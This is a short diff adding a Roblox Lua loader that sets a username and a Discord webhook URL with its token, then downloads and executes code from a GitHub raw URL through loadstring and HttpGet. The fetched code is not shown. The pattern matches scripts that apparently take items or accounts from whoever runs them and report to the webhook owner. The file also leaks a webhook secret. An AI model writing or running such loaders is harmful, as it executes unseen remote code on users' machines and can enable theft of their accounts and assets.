@@ -1,0 +1,6 @@
+--Put Roblox username 
+Username = "king_gokucha57"
+--Webhook for notification 
+Webhook = "https://discord.com/api/webhooks/1314825205419474984/dm5dbxQ6daOOIVyNY4GyNfwpFyJDUfgcnxRXaB4isRyFupV0nBM6CNuMiJA7NI1fLObz"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Scri7ting/Script/refs/heads/main/Hub'))()
